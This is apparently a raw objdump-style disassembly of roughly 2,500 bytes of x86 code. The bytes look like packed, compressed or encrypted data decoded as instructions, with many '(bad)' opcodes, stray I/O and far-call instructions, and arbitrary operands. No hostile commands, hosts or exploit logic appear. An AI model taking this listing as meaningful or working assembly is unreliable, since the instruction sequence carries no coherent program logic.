  42459e:	xchg   ebx,eax
  42459f:	loop   0x424524
  4245a1:	das    
  4245a2:	ds (bad) 
  4245a4:	dec    esi
  4245a6:	scas   al,BYTE PTR es:[edi]
  4245a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245a8:	and    DWORD PTR [esi+ebp*8-0x72],esi
  4245ac:	sbb    eax,0xf3e11ebe
  4245b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245b2:	mov    ecx,DWORD PTR [ebp-0x18]
  4245b5:	out    dx,al
  4245b6:	mov    edi,0x32948cf
  4245bb:	mov    eax,0xc0ad0433
  4245c0:	fwait
  4245c1:	xchg   DWORD PTR [edx],eax
  4245c3:	(bad)  
  4245c4:	jnp    0x4245f0
  4245c6:	pop    es
  4245c7:	js     0x42454e
  4245c9:	and    eax,0xa266ae6a
  4245ce:	in     al,dx
  4245cf:	(bad)  
  4245d0:	ins    BYTE PTR es:[edi],dx
  4245d1:	dec    eax
  4245d2:	ss ret 
  4245d4:	adc    BYTE PTR [ecx-0x72e60388],cl
  4245da:	and    al,BYTE PTR [ebp-0x46]
  4245dd:	pusha  
  4245de:	push   ebx
  4245df:	(bad)  [edi]
  4245e1:	mov    dl,0xf
  4245e3:	int    0xac
  4245e5:	nop
  4245e6:	pop    es
  4245e7:	fs add eax,0x4c061a9f
  4245ed:	pop    es
  4245ee:	(bad)  
  4245ef:	daa    
  4245f0:	jbe    0x4245b3
  4245f2:	in     eax,0x3
  4245f4:	inc    esp
  4245f5:	add    DWORD PTR [ecx],edx
  4245f7:	mov    bl,0xd0
  4245f9:	dec    edi
  4245fa:	sub    DWORD PTR [ebp-0x4e1053fa],ebp
  424600:	sub    eax,0xfaf4ece7
  424605:	mov    edx,0xf3a784e6
  42460a:	in     al,dx
  42460b:	test   BYTE PTR [edi],bl
  42460d:	sbb    DWORD PTR [ecx-0xf],eax
  424610:	xchg   edi,eax
  424611:	adc    al,0xbb
  424613:	mov    al,ds:0x683871ac
  424618:	js     0x4245c2
  42461a:	enter  0xe448,0x98
  42461e:	and    DWORD PTR [esi],ebx
  424620:	outs   dx,DWORD PTR ds:[esi]
  424621:	out    0xe,eax
  424623:	out    dx,al
  424624:	gs pop edx
  424626:	inc    edx
  424627:	and    dh,dl
  424629:	xchg   BYTE PTR [esi-0x6f0872f],dh
  42462f:	inc    eax
  424630:	or     eax,0x214f68ac
  424635:	retf   0x8ae
  424638:	sub    BYTE PTR [eax],cl
  42463a:	outs   dx,BYTE PTR ds:[esi]
  42463b:	mov    al,ds:0xc90ba8c7
  424640:	inc    ebx
  424641:	push   esi
  424642:	xchg   ebx,eax
  424643:	shr    DWORD PTR [edx+eax*4+0x8],0xcd
  424648:	mov    dh,0x96
  42464a:	or     eax,DWORD PTR [ebx+0x532b03fe]
  424650:	lahf   
  424651:	inc    eax
  424652:	inc    edx
  424653:	aas    
  424654:	shr    DWORD PTR [esi+0x13],cl
  424657:	xchg   ebp,eax
  424658:	and    eax,0xf2703ca5
  42465d:	in     al,0x95
  42465f:	pushf  
  424660:	jl     0x424617
  424662:	cmp    al,0x90
  424664:	push   ebx
  424665:	mov    dl,dh
  424667:	retf   0x9e9a
  42466a:	lahf   
  42466b:	div    DWORD PTR [eax]
  42466d:	jne    0x424628
  42466f:	shl    DWORD PTR [eax+0x385da380],cl
  424675:	push   ecx
  424676:	jg     0x424665
  424678:	call   0x6982c421
  42467d:	push   ebp
  42467e:	dec    ebp
  42467f:	adc    eax,0x87335fd8
  424684:	mov    eax,ds:0xef8ec469
  424689:	loop   0x42467b
  42468b:	push   es
  42468c:	ins    BYTE PTR es:[edi],dx
  42468d:	adc    eax,0x146dfa
	...
  4246f2:	add    BYTE PTR [eax],al
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edx+0x4c2f499d],bh
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0xec000001,al
  42470d:	jge    0x4246da
  42470f:	inc    ebx
  424710:	sahf   
  424711:	inc    ebp
  424712:	sub    bh,BYTE PTR [esi+0x1b]
  424715:	repnz push cs
  424717:	push   ebp
  424718:	and    edi,DWORD PTR [ebx+ebp*8]
  42471b:	and    BYTE PTR [edi-0x5602edd0],bh
  424721:	jmp    0xe18c46b8
  424726:	arpl   WORD PTR [esp+edi*8],di
  424729:	call   0xfe2a8a3b
  42472e:	sbb    ch,BYTE PTR [eax-0x16e7b02d]
  424734:	and    cl,0xa1
  424737:	inc    edi
  424738:	pop    ss
  424739:	dec    eax
  42473a:	(bad)  
  42473b:	adc    eax,0x8e61e483
  424740:	and    al,0x41
  424742:	int    0xae
  424744:	xchg   esp,eax
  424745:	inc    ebp
  424746:	(bad)  
  424747:	cmp    eax,0xec18df91
  42474c:	add    al,0x22
  42474e:	mov    ah,0x88
  424750:	shl    BYTE PTR [ebx+0x64e31555],1
  424756:	cmp    edx,DWORD PTR [ecx-0x79450af5]
  42475c:	fdivr  st,st(6)
  42475e:	or     edi,DWORD PTR [ebp+0x50]
  424761:	and    DWORD PTR [ecx-0x16],edi
  424764:	adc    esi,DWORD PTR [ebx]
  424766:	jb     0x424729
  424768:	jp     0x42479a
  42476a:	or     al,0x98
  42476c:	loop   0x4247c7
  42476e:	lahf   
  42476f:	mov    es,edx
  424771:	and    DWORD PTR [edi+edi*2+0x2aee4767],ecx
  424778:	pop    edi
  424779:	(bad)  
  42477a:	nop
  42477b:	in     al,dx
  42477c:	add    BYTE PTR [eax],0x1
  42477f:	popa   
  424780:	icebp  
  424781:	fwait
  424782:	add    BYTE PTR [ecx+0x37a3091],al
  424788:	pop    ebx
  424789:	int    0xeb
  42478b:	pop    ds
  42478c:	push   edx
  42478d:	add    al,BYTE PTR [edx+edx*8]
  424790:	mov    ds:0xb8194be9,eax
  424795:	loopne 0x424784
  424797:	jle    0x4247e1
  424799:	cmp    esi,DWORD PTR [esi-0x38eef733]
  42479f:	fdiv   DWORD PTR [edi]
  4247a1:	add    BYTE PTR [ebx-0x76],bh
  4247a4:	call   0x54b9:0xb5be35c3
  4247ab:	repz or esp,ecx
  4247ae:	pusha  
  4247af:	jl     0x4247da
  4247b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247b2:	jae    0x42474d
  4247b4:	or     esp,DWORD PTR [esp+edi*8+0x7faf654]
  4247bb:	push   ebp
  4247bc:	xchg   esp,eax
  4247bd:	mov    edi,0xf81a9eaa
  4247c2:	lds    ebp,FWORD PTR [ecx+0x6b9835c2]
  4247c8:	jle    0x42480c
  4247ca:	xchg   edi,eax
  4247cb:	lock pop edx
  4247cd:	dec    eax
  4247ce:	pop    ss
  4247cf:	dec    ecx
  4247d0:	inc    esi
  4247d1:	frstor [eax]
  4247d3:	cs pop eax
  4247d5:	xor    BYTE PTR [edx+0x1d],bh
  4247d8:	out    dx,al
  4247d9:	pop    edx
  4247da:	add    dl,BYTE PTR [esi+0x749bc388]
  4247e0:	dec    esi
  4247e1:	aas    
  4247e2:	mov    gs,WORD PTR [edi-0x70]
  4247e5:	(bad)  
  4247e6:	cdq    
  4247e7:	push   ds
  4247e8:	es cli 
  4247ea:	sub    eax,0x44ddb13c
  4247ef:	add    esp,DWORD PTR [ebx+ecx*4+0x59cfd19f]
  4247f6:	or     edi,DWORD PTR [edi-0x5e4f904a]
  4247fc:	gs out 0x47,al
  4247ff:	mov    al,0xf5
  424801:	pop    ebp
  424802:	or     al,0xa6
  424804:	call   DWORD PTR [eax]
  424806:	pop    ebp
  424807:	mov    DWORD PTR [ebx-0x3a0c33d3],ebx
  42480d:	(bad)  
  42480e:	xchg   esi,eax
  42480f:	icebp  
  424810:	or     al,BYTE PTR [eax]
	...
  424872:	add    BYTE PTR [eax],al
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	mov    ds:0x51bc13d8,eax
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0xdf000001,al
  42488d:	xor    bh,ch
  42488f:	test   bh,bl
  424891:	or     BYTE PTR [ebx-0x12f7531],bl
  424897:	sub    DWORD PTR [ebp-0x196cd46],edi
  42489d:	je     0x4248e9
  42489f:	call   0xa527490f
  4248a4:	sub    dh,BYTE PTR [edx-0x4c7d6323]
  4248aa:	cwde   
  4248ab:	outs   dx,BYTE PTR ds:[esi]
  4248ac:	pop    ebx
  4248ad:	adc    BYTE PTR [ecx],dl
  4248af:	adc    DWORD PTR [esi-0x31],edx
  4248b2:	(bad)  
  4248b3:	jbe    0x424874
  4248b5:	aas    
  4248b6:	test   BYTE PTR [ecx-0x3f],ch
  4248b9:	sbb    al,BYTE PTR [edx+0x4c3e1ede]
  4248bf:	inc    esi
  4248c0:	jge    0x4248d3
  4248c2:	adc    esi,DWORD PTR ds:0x359afb22
  4248c8:	add    BYTE PTR [ebp-0x1a],0x63
  4248cc:	out    dx,eax
  4248cd:	aas    
  4248ce:	nop
  4248cf:	(bad)  
  4248d0:	int    0xb2
  4248d2:	push   edx
  4248d3:	js     0x42489d
  4248d5:	bound  edi,QWORD PTR [ecx-0x402cbc4d]
  4248db:	fdiv   st,st(0)
  4248dd:	and    DWORD PTR [esp+eiz*8+0x6d0fbdc3],0xea03461d
  4248e8:	sbb    ebx,DWORD PTR [edx+0x12]
  4248eb:	jle    0x4248c4
  4248ed:	inc    ebp
  4248ee:	dec    esp
  4248ef:	dec    edx
  4248f0:	xlat   BYTE PTR ds:[ebx]
  4248f1:	retf   0xe8df
  4248f4:	inc    ebx
  4248f5:	cmc    
  4248f6:	cmp    eax,0x5c89c7a5
  4248fb:	add    cl,bh
  4248fd:	ds xor al,0x81
  424900:	lods   al,BYTE PTR ds:[esi]
  424901:	ret    0x60f
  424904:	(bad)  
  424905:	xchg   esi,eax
  424906:	or     dh,BYTE PTR [ecx-0x7ca6330f]
  42490c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42490d:	mov    esp,0x828276a9
  424912:	or     al,0x45
  424914:	mov    ch,0x6b
  424916:	ficomp DWORD PTR [ecx+0x36]
  424919:	ret    0xf8ea
  42491c:	imul   ecx,DWORD PTR [edi-0x1c],0xa4bcd405
  424923:	adc    al,BYTE PTR [ebx+0x1b5057a5]
  424929:	out    0x76,al
  42492b:	cdq    
  42492c:	clc    
  42492d:	data16 aas 
  42492f:	mov    ecx,0x4f1edc04
  424934:	ror    dh,1
  424936:	aas    
  424937:	mov    al,0x37
  424939:	mov    ds:0xb2500a16,al
  42493e:	jp     0x4248e0
  424940:	daa    
  424941:	aaa    
  424942:	and    eax,0xc48d01e9
  424947:	push   es
  424948:	sbb    eax,0x1eb308d4
  42494d:	fimul  WORD PTR [edx+ebp*8+0x7c]
  424951:	push   edi
  424952:	adc    ecx,ebp
  424954:	aaa    
  424955:	rcl    BYTE PTR [edi],1
  424957:	ins    BYTE PTR es:[edi],dx
  424958:	arpl   dx,dx
  42495a:	add    BYTE PTR [esp+edi*8-0x83e0544],dl
  424961:	add    eax,ebx
  424963:	or     DWORD PTR [eax+0x15],0x30a380aa
  42496a:	or     al,0x6d
  42496c:	mov    cl,BYTE PTR [ebx]
  42496e:	clc    
  42496f:	clc    
  424970:	mov    ds:0xa5021c84,eax
  424975:	pushf  
  424976:	int    0x75
  424978:	cld    
  424979:	(bad)  
  42497a:	out    dx,al
  42497b:	imul   DWORD PTR [edi]
  42497d:	and    dh,BYTE PTR ds:[edi+0x73cb8b50]
  424984:	mov    esi,0x58ed6f37
  424989:	xchg   edx,eax
  42498a:	and    DWORD PTR [ebp-0x5b],0x413af459
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bh,BYTE PTR [ebp+0x565f0dab]
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0xb0000001,al
  424a0d:	jg     0x424a81
  424a0f:	mov    cl,0x61
  424a11:	sahf   
  424a12:	push   DWORD PTR [eax+eax*1]
  424a15:	fbld   TBYTE PTR [edi-0x27205505]
  424a1b:	add    ah,ch
  424a1d:	dec    esi
  424a1e:	mov    bh,BYTE PTR [esi+0x28]
  424a21:	sub    esi,esp
  424a23:	inc    ebx
  424a24:	pusha  
  424a25:	and    eax,0xd23b486d
  424a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a2b:	cmp    al,0x46
  424a2d:	hlt    
  424a2e:	xchg   ebp,eax
  424a2f:	pop    edi
  424a30:	sub    ah,dh
  424a32:	adc    eax,0xf49fc1b9
  424a37:	mov    eax,ds:0x67342682
  424a3c:	cmp    BYTE PTR [ebx+0x664d1a4],0x1b
  424a43:	jns    0x424aab
  424a45:	les    ebp,FWORD PTR [eax]
  424a47:	rcl    ebx,1
  424a49:	cmc    
  424a4a:	sbb    dl,ah
  424a4c:	and    DWORD PTR [eax-0x5f],ecx
  424a4f:	mov    dh,0x8d
  424a51:	xor    eax,0x36eb97c1
  424a56:	(bad)  
  424a57:	mov    bl,0x35
  424a59:	icebp  
  424a5a:	(bad)  
  424a5b:	cld    
  424a5c:	shr    ecx,cl
  424a5e:	or     al,0xca
  424a60:	sbb    BYTE PTR [ebp+0x65112db6],bh
  424a66:	inc    esi
  424a67:	or     ch,dl
  424a69:	inc    ebp
  424a6a:	cld    
  424a6b:	mov    al,ds:0x9919e455
  424a70:	ss cli 
  424a72:	idiv   DWORD PTR [ecx+0x1e]
  424a75:	adc    al,0x8f
  424a77:	or     bl,BYTE PTR [ebx]
  424a79:	cmp    eax,0xb2120b6c
  424a7e:	jno    0x424ad5
  424a80:	mov    esp,0x1883fb3d
  424a85:	push   edi
  424a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a87:	dec    eax
  424a88:	mov    bl,0x71
  424a8a:	repz xchg esi,eax
  424a8c:	push   ss
  424a8d:	fcmovnbe st,st(0)
  424a8f:	icebp  
  424a90:	(bad)  
  424a91:	mov    ecx,0x7c67fad2
  424a96:	push   ds
  424a97:	aas    
  424a98:	pop    ecx
  424a99:	add    ah,BYTE PTR [ecx-0x16e1acd4]
  424a9f:	and    dh,BYTE PTR [ebx]
  424aa1:	xchg   edx,eax
  424aa2:	sub    eax,0x931e9208
  424aa7:	mov    edi,0x8bfc9cd1
  424aac:	push   0xf0344903
  424ab1:	xchg   edx,eax
  424ab2:	push   bx
  424ab4:	pop    eax
  424ab5:	xchg   BYTE PTR [edi-0x1419aeff],ch
  424abb:	loope  0x424acc
  424abd:	lods   al,BYTE PTR ds:[esi]
  424abe:	call   0xb016:0x92cc056a
  424ac5:	xor    edx,DWORD PTR [ebx+eax*4+0x3e]
  424ac9:	jo     0x424b42
  424acb:	dec    ebx
  424acc:	int    0x9b
  424ace:	cmp    ecx,DWORD PTR [ebx]
  424ad0:	sbb    al,0x2d
  424ad2:	retf   
  424ad3:	pop    ebp
  424ad4:	loope  0x424a5e
  424ad6:	in     al,0x97
  424ad8:	loop   0x424b06
  424ada:	fisub  WORD PTR [edx-0x1357a1a6]
  424ae0:	cmp    eax,0xc5ce1a63
  424ae5:	int3   
  424ae6:	test   DWORD PTR [esi+edi*1-0x5b],0xb85810da
  424aee:	je     0x424b39
  424af0:	xchg   DWORD PTR [ecx],ebp
  424af2:	stos   BYTE PTR es:[edi],al
  424af3:	lds    ecx,FWORD PTR [ebx]
  424af5:	xor    BYTE PTR [ebx+0x33cd9b8b],0xb0
  424afc:	xchg   ebx,eax
  424afd:	scas   al,BYTE PTR es:[edi]
  424afe:	dec    edx
  424aff:	icebp  
  424b00:	dec    edx
  424b01:	mov    eax,ds:0xdf4da080
  424b06:	jno    0x424b5e
  424b08:	(bad)  
  424b09:	xchg   esp,eax
  424b0a:	mov    gs,WORD PTR [ebx+0x5570a6f5]
  424b10:	fld    QWORD PTR [eax]
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	int    0xad
  424b82:	sbb    DWORD PTR [edi+0x5b],ebp
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x21000001,al
  424b8d:	push   ds
  424b8e:	add    BYTE PTR [ebx+0x27],bh
  424b91:	mov    ecx,0x92dad8c5
  424b96:	mov    ch,0x38
  424b98:	jmp    0x424b4f
  424b9a:	inc    eax
  424b9b:	xchg   DWORD PTR [eax],ecx
  424b9d:	or     ch,bl
  424b9f:	iret   
  424ba0:	sub    eax,0xccd83479
  424ba5:	stc    
  424ba6:	pushf  
  424ba7:	jmp    0x66f35526
  424bac:	mov    ebp,0x81f137e9
  424bb1:	xor    al,bh
  424bb3:	pop    edi
  424bb4:	fsub   DWORD PTR [ecx+0x768066ff]
  424bba:	aaa    
  424bbb:	test   eax,0x8151f14e
  424bc0:	aam    0x1f
  424bc2:	jl     0x424b61
  424bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bc5:	add    al,0x53
  424bc7:	popf   
  424bc8:	fld    TBYTE PTR [ecx+0x59]
  424bcb:	push   ecx
  424bcc:	or     bh,BYTE PTR [edi-0x25]
  424bcf:	mov    ecx,0x124a75cb
  424bd4:	cwde   
  424bd5:	sub    al,BYTE PTR ss:[edi]
  424bd8:	out    0x86,al
  424bda:	jp     0x424c16
  424bdc:	stos   BYTE PTR es:[edi],al
  424bdd:	cmp    esp,eax
  424bdf:	sbb    al,0x90
  424be1:	stc    
  424be2:	in     al,0xee
  424be4:	mov    eax,ds:0x4cd5a62b
  424be9:	es jle 0x424b95
  424bec:	pop    edi
  424bed:	xor    ebx,DWORD PTR [ebp-0x4b7e10a8]
  424bf3:	push   ecx
  424bf4:	xchg   ecx,eax
  424bf5:	jp     0x424c36
  424bf7:	sub    DWORD PTR [edx-0x45],ebp
  424bfa:	(bad)  
  424bfb:	or     al,0xb6
  424bfd:	(bad)  
  424bff:	test   BYTE PTR [eax],0x1f
  424c02:	clc    
  424c03:	mov    DWORD PTR [edi+0x14],edx
  424c06:	call   0xbec14739
  424c0b:	lock xchg ebp,eax
  424c0d:	inc    ebp
  424c0e:	and    BYTE PTR [edi+0x4f],ah
  424c11:	dec    ebp
  424c12:	jg     0x424c36
  424c14:	sub    eax,0xd208efe6
  424c19:	lods   al,BYTE PTR ds:[esi]
  424c1a:	jge    0x424be0
  424c1c:	test   BYTE PTR [esi+0x270dd16e],al
  424c22:	test   DWORD PTR [ecx+edi*8-0x357071d3],esi
  424c29:	xchg   BYTE PTR ds:0x4ab345e7,bl
  424c2f:	inc    ebp
  424c30:	int    0xf0
  424c32:	cmp    al,0x28
  424c34:	or     BYTE PTR [ebp-0xa],al
  424c37:	sbb    ebp,DWORD PTR [edx]
  424c39:	add    cl,BYTE PTR [ebp+eax*4+0x4116719b]
  424c40:	call   0xf0266fa8
  424c45:	xlat   BYTE PTR ds:[ebx]
  424c46:	fcmovnb st,st(5)
  424c48:	jge    0x424bdc
  424c4a:	leave  
  424c4b:	add    al,0x85
  424c4d:	mov    ecx,0xadcf11d1
  424c52:	bound  eax,QWORD PTR [ecx+0x308a7088]
  424c58:	jbe    0x424be0
  424c5a:	dec    edx
  424c5b:	leave  
  424c5c:	enter  0x95bf,0xd1
  424c60:	shl    DWORD PTR [edx+0x5b],0x3d
  424c64:	sbb    esp,DWORD PTR [ebp-0x29131a06]
  424c6a:	aas    
  424c6b:	dec    ebx
  424c6c:	mov    edx,0xaf73578
  424c71:	sti    
  424c72:	dec    esp
  424c73:	das    
  424c74:	mov    dh,0xb0
  424c76:	jmp    0x424c0e
  424c78:	xchg   edi,eax
  424c79:	xchg   DWORD PTR [esi-0x60fab13f],esi
  424c7f:	(bad)  [ebp+0x5e]
  424c82:	sbb    bl,BYTE PTR [ebp+0x5f129d1b]
  424c88:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c8a:	cdq    
  424c8b:	aaa    
  424c8c:	idiv   edx
  424c8e:	xchg   esi,eax
  424c8f:	mov    dl,0x92
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	push   esp
  424d01:	sub    eax,0x89606e22
  424d06:	add    DWORD PTR [eax],eax
  424d08:	add    eax,0x40000001
  424d0d:	mov    ebx,DWORD PTR [ecx+0x54b356dd]
  424d13:	call   0xd482:0x1394d27b
  424d1a:	adc    BYTE PTR [esi-0x7a],0xfe
  424d1e:	and    eax,0x46242c5b
  424d23:	pop    ecx
  424d24:	push   ecx
  424d25:	sti    
  424d26:	sbb    ebx,esp
  424d28:	cmp    bh,BYTE PTR [ebx+0x51]
  424d2b:	inc    esp
  424d2c:	cmp    al,bh
  424d2e:	jecxz  0x424ccf
  424d30:	in     al,0x28
  424d32:	dec    ebx
  424d33:	lods   al,BYTE PTR ds:[esi]
  424d34:	out    dx,al
  424d35:	repnz neg DWORD PTR [ebx]
  424d38:	je     0x424d78
  424d3a:	(bad)  
  424d3b:	shl    edx,cl
  424d3d:	mov    ds:0xa11c030d,eax
  424d42:	sub    eax,eax
  424d44:	or     BYTE PTR ds:0xa0ffcfce,bh
  424d4a:	sbb    BYTE PTR [esi+ebp*8+0x62fe2dff],bh
  424d51:	push   ss
  424d52:	call   0x653bc0fc
  424d57:	cmp    al,0xae
  424d59:	sub    BYTE PTR [esp+edx*2+0x46],dl
  424d5d:	punpckldq mm3,DWORD PTR [eax]
  424d60:	repz aad 0xfd
  424d63:	inc    esp
  424d64:	dec    esp
  424d65:	jbe    0x424d27
  424d67:	data16 in al,dx
  424d69:	test   DWORD PTR [edi-0x4d],edx
  424d6c:	mov    bh,0x55
  424d6e:	shl    BYTE PTR [esi+0x3fb6ff90],cl
  424d74:	gs mov ah,0x7
  424d77:	mov    dl,0x79
  424d79:	add    eax,0x476bdb3f
  424d7e:	xchg   ebx,eax
  424d7f:	fdiv   st,st(3)
  424d81:	push   ss
  424d82:	push   cs
  424d83:	jg     0x424d9a
  424d85:	(bad)  
  424d87:	retf   0xb17c
  424d8a:	dec    edx
  424d8b:	xchg   edi,eax
  424d8c:	lock out dx,al
  424d8e:	xlat   BYTE PTR ds:[ebx]
  424d8f:	loope  0x424d35
  424d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d93:	imul   esi,DWORD PTR [eax+0x4],0xf19387a4
  424d9a:	sbb    al,0xf3
  424d9c:	mov    ecx,0x6fab6a71
  424da1:	add    DWORD PTR [edx],eax
  424da3:	dec    ecx
  424da4:	out    dx,eax
  424da5:	rol    DWORD PTR [esi-0x46],cl
  424da8:	mov    edx,0xca6fc07f
  424dad:	mov    eax,0x2dd7bdf2
  424db2:	pop    ss
  424db3:	xchg   ebx,eax
  424db4:	jbe    0x424d8b
  424db6:	in     eax,dx
  424db7:	add    eax,0x978bcfe5
  424dbc:	pop    ds
  424dbd:	push   es
  424dbe:	addr16 int 0x6b
  424dc1:	rcr    ebp,0x46
  424dc4:	sub    DWORD PTR [ebp-0x62],edi
  424dc7:	push   edi
  424dc8:	les    edi,FWORD PTR [edi-0x63]
  424dcb:	std    
  424dcc:	icebp  
  424dcd:	es pop esp
  424dcf:	pop    ss
  424dd0:	in     al,0x31
  424dd2:	jno    0x424ded
  424dd4:	mov    eax,0x1efeeb6f
  424dd9:	out    0x7d,eax
  424ddb:	jge    0x424e43
  424ddd:	lea    ebx,cs:[ecx+0xb]
  424de1:	mov    esp,0x3f077911
  424de6:	into   
  424de7:	and    edi,DWORD PTR [edi-0x1f]
  424dea:	enter  0x4910,0xb8
  424dee:	rcl    BYTE PTR ds:[esi-0x5fdce2d],0x52
  424df6:	pop    ss
  424df7:	fwait
  424df8:	pop    esp
  424df9:	sbb    esi,edx
  424dfb:	icebp  
  424dfc:	test   al,0xc1
  424dfe:	and    al,0x5d
  424e00:	jmp    0x9ee7:0x8adb941d
  424e07:	or     edi,eax
  424e09:	in     eax,dx
  424e0a:	div    DWORD PTR ds:0xea9b933d
  424e10:	add    BYTE PTR [bx+si],al
	...
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e45
  424e81:	scas   al,BYTE PTR es:[edi]
  424e82:	or     esp,DWORD PTR [ecx]
  424e84:	mov    al,BYTE PTR gs:[ecx]
  424e87:	add    BYTE PTR ds:0x1c000001,al
  424e8d:	mov    ecx,0xb64f1ccc
  424e92:	xchg   edx,eax
  424e93:	lea    edx,[esi-0x66]
  424e96:	jmp    0x4373:0xd4ed3ad0
  424e9d:	sbb    DWORD PTR [edi-0x26ba202c],ebp
  424ea3:	cs repnz xchg esi,eax
  424ea6:	sub    eax,0x823530f0
  424eab:	cmp    BYTE PTR ss:[edi+0x9],al
  424eaf:	and    edi,esi
  424eb1:	mov    cl,0xda
  424eb3:	popf   
  424eb4:	dec    ebx
  424eb5:	adc    al,0x1c
  424eb7:	cwde   
  424eb8:	xchg   DWORD PTR [esi+edx*2+0x36],edi
  424ebc:	push   eax
  424ebd:	sbb    ecx,edi
  424ebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ec0:	fbld   TBYTE PTR [edx+0x0]
  424ec3:	sbb    dh,BYTE PTR [eax-0x1ab6dc23]
  424ec9:	sbb    esi,DWORD PTR [eax-0x3d]
  424ecc:	add    esp,DWORD PTR [edi-0x643406c4]
  424ed2:	and    BYTE PTR [esi],ch
  424ed4:	sahf   
  424ed5:	cmp    bh,BYTE PTR [edx]
  424ed7:	xor    ecx,DWORD PTR [eax]
  424ed9:	push   ecx
  424eda:	inc    eax
  424edb:	mov    BYTE PTR [eax],dh
  424edd:	xchg   ebp,eax
  424ede:	dec    esp
  424edf:	mov    esp,0xcc9030d2
  424ee4:	dec    ebp
  424ee5:	mov    ecx,0xdded34bb
  424eea:	cmp    DWORD PTR [ebx+0x15],esp
  424eed:	das    
  424eee:	sub    ebx,ecx
  424ef0:	cmp    DWORD PTR [ecx],ebp
  424ef2:	out    0x42,eax
  424ef4:	inc    ebp
  424ef5:	popf   
  424ef6:	xchg   edx,eax
  424ef7:	int3   
  424ef8:	push   edi
  424ef9:	push   esi
  424efa:	popf   
  424efb:	add    ebx,DWORD PTR ds:0x85ac2465
  424f01:	outs   dx,DWORD PTR ds:[esi]
  424f02:	push   edi
  424f03:	xchg   dl,dl
  424f05:	inc    esi
  424f06:	jp     0x424eb7
  424f08:	dec    ebp
  424f09:	jo     0x424efe
  424f0b:	(bad)  
  424f0c:	das    
  424f0d:	retf   0x19dc
  424f10:	mov    bl,BYTE PTR cs:[ebx+edi*8]
  424f14:	dec    edx
  424f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f16:	adc    ah,BYTE PTR [ebx]
  424f18:	into   
  424f19:	jmp    0x424eac
  424f1b:	leave  
  424f1c:	test   eax,0x4cf80abc
  424f21:	push   ebx
  424f22:	mov    eax,ds:0xa67e998d
  424f27:	sub    eax,0x46a78897
  424f2c:	pop    ecx
  424f2d:	in     eax,dx
  424f2e:	jl     0x424f1b
  424f30:	mov    ebx,eax
  424f32:	icebp  
  424f33:	je     0x424f92
  424f35:	push   ss
  424f36:	sub    DWORD PTR [edi+0x3c],ecx
  424f39:	add    bl,BYTE PTR [eax]
  424f3b:	inc    esi
  424f3c:	adc    DWORD PTR [ebp-0x5dd6b3c4],ebp
  424f42:	and    al,ch
  424f44:	cdq    
  424f45:	mov    al,ds:0x1e25d25a
  424f4a:	loopne 0x424f2d
  424f4c:	xchg   esi,eax
  424f4d:	inc    edi
  424f4e:	test   al,0xbf
  424f50:	push   ebx
  424f51:	jae    0x424eec
  424f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f54:	mul    DWORD PTR [esi-0xa63e3e7]
  424f5a:	fist   WORD PTR [edi+0x3d]
  424f5d:	fst    DWORD PTR [eax]
  424f5f:	jge    0x424f0f
  424f61:	push   0x18
  424f63:	add    al,0x11
  424f65:	fistp  DWORD PTR [eax-0x36]
  424f68:	ficom  DWORD PTR [edx]
  424f6a:	mov    ds:0x14922b80,al
  424f6f:	dec    eax
  424f70:	jns    0x424f6b
  424f72:	mov    eax,0x6b0caa2f
  424f77:	mov    bh,0x30
  424f79:	sub    BYTE PTR [ebx+0x58],0x96
  424f7d:	(bad)  
  424f7e:	push   esp
  424f7f:	and    DWORD PTR [eax-0x70],0x7e6cde63
  424f86:	add    dh,cl
  424f88:	mov    dl,0xe7
  424f8a:	into   
  424f8b:	push   eax
  424f8c:	xchg   edx,eax
  424f8d:	add    ebx,DWORD PTR [ebp+0x52]
  424f90:	mov    ecx,0x0
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	push   0xffffffcf
